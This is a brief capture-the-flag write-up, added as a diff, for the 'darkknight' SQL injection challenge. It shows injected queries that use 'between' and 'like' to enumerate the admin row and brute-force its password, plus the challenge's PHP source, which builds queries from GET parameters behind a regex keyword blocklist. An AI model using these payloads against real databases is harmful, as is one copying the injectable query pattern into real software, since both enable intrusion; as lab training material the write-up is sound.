@@ -1,0 +1,36 @@
+1. Find admin:
+--------------
+
+query : select id from prob_darkknight where id='guest' and pw='' and no=1 or no between X and 9
+
+X = 1..9
+
+Results:
+1 = quest
+2 = admin
+
+2. Find admin password:
+-----------------------
+
+brute query : select id from prob_darkknight where id='guest' and pw='asdsd' and no=1 or no between 2 and 2 and pw like "%"
+
+
+Hello admin
+<?php 
+  include "./config.php"; 
+  login_chk(); 
+  $db = dbconnect(); 
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
+  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
+  if(preg_match('/\'|substr|ascii|=/i', $_GET[no])) exit("HeHe"); 
+  $query = "select id from prob_darkknight where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
+  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
+  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
+  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
+   
+  $_GET[pw] = addslashes($_GET[pw]); 
+  $query = "select pw from prob_darkknight where id='admin' and pw='{$_GET[pw]}'"; 
+  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
+  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("darkknight"); 
+  highlight_file(__FILE__); 
+?>
